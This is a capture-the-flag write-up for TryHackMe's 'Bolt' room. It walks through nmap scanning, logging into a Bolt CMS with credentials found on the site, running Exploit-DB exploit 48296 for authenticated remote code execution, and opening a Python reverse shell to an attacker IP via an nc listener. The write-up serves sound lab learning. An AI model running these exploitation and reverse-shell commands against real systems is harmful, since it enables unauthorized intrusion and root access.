---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/bolt/","tags":["CTF","write-up","RCE","boltCMS"]}
---


![d2a747d195d4607cfd296eb2cffb7af1.png|200](/img/user/attachments/d2a747d195d4607cfd296eb2cffb7af1.png)

---

> [!INFO] Info about Bolt
>  A hero is unleashed


> [!FAQ]- Hints
> This room is designed for users to get familiar with the Bolt CMS and how it can be exploited using Authenticated Remote Code Execution.

---
# Active reconnaissance

## Port scan
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 61
80/tcp   open  http     syn-ack ttl 61
8000/tcp open  http-alt syn-ack ttl 61
```

---
# Enumeration (Port and service)
```shell
sudo nmap TARGET_IP -sCV -p 22,80,8000 -oG nmap_enum
```
## OS
Ubuntu
ubuntu18.04.1+deb.sury.org+1
## Port 22 OpenSSH
```c
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
```
## Port 80 Apache
http-server-header: **Apache/2.4.29** (Ubuntu)
http-title: Apache2 Ubuntu Default Page: It works
X-Powered-By: **PHP/7.2.32**-1+ubuntu18.04.1+deb.sury.org2211
## Port 8000 CMS Bolt
8000/tcp open  http    (**PHP 7.2.32**-1)
```c
|_http-generator: Bolt
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Date: Sun, 17 Nov 2024 23:09:35 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Sun, 17 Nov 2024 23:09:35 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: b8e30c
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest:
|     HTTP/1.0 200 OK
|     Date: Sun, 17 Nov 2024 23:09:34 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Sun, 17 Nov 2024 23:09:34 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: 631c16
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-title: Bolt | A hero is unleashed
```

> [!check] What port number has a web server with a CMS running?
> 8***

> [!check] What is the username we can find in the CMS?
> ![Pasted image 20241118112632.png](/img/user/attachments/Pasted%20image%2020241118112632.png)


> [!check] What is the password we can find for the username?
> ![Pasted image 20241118112756.png](/img/user/attachments/Pasted%20image%2020241118112756.png)

From the documentation of bolt, we know that the backend is on `/bolt`.
![Pasted image 20241118113434.png](/img/user/attachments/Pasted%20image%2020241118113434.png)
We were redirected to the login page
![Pasted image 20241118113930.png](/img/user/attachments/Pasted%20image%2020241118113930.png)
Login with credentials from above
After login, we can respond the next answer

> [!check] What version of the CMS is installed on the server? (Ex: Name 1.1.1)
> ![Pasted image 20241118123137.png](/img/user/attachments/Pasted%20image%2020241118123137.png)


---
# Vulnerability analysis
## OpenSSH
This version of SSH is vulnerable to Local enumeration
## Apache
## Bolt
### Remote Code Execution (RCE)
> [!check] There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?
> Check with searsploit
> ![Pasted image 20241119101436.png](/img/user/attachments/Pasted%20image%2020241119101436.png)

> [!check] Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)
> Login to msfconsole and execute
> ![Pasted image 20241119101842.png](/img/user/attachments/Pasted%20image%2020241119101842.png)

---
# Exploitation
## Bolt
### Exploiting RCE
In this case I will use the python exploit of `searhsploit`, we need valid credentials to access the admin dashboard. We already have them.
![Pasted image 20241119101436.png](/img/user/attachments/Pasted%20image%2020241119101436.png)
Get the exploit
```shell
searchsploit -m 48296
```

Execute it
```shell
python 48296.py http://bolt.thm:8000 bolt boltadmin123
```
![Pasted image 20241119105831.png|700](/img/user/attachments/Pasted%20image%2020241119105831.png)
![Pasted image 20241119105910.png|400](/img/user/attachments/Pasted%20image%2020241119105910.png)
In this case, this critic vulnerability allows to get a `root` RCE
### Get a reverse shell
On our attacker machine, execute the listener.
```shell
rlwrap nc -lnvp 4747
```

On the victim machine execute the python revere shell code
```shell
export RHOST="10.6.2.59";export RPORT=4747;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

We have the reverse shell
![Pasted image 20241119111032.png](/img/user/attachments/Pasted%20image%2020241119111032.png)

> [!check] Look for flag.txt inside the machine.
> Look for the flag and show up
> ![Pasted image 20241119111443.png](/img/user/attachments/Pasted%20image%2020241119111443.png)

In this case, we don't need to escalate privileges since we already have access to an account with elevated privileges.

---
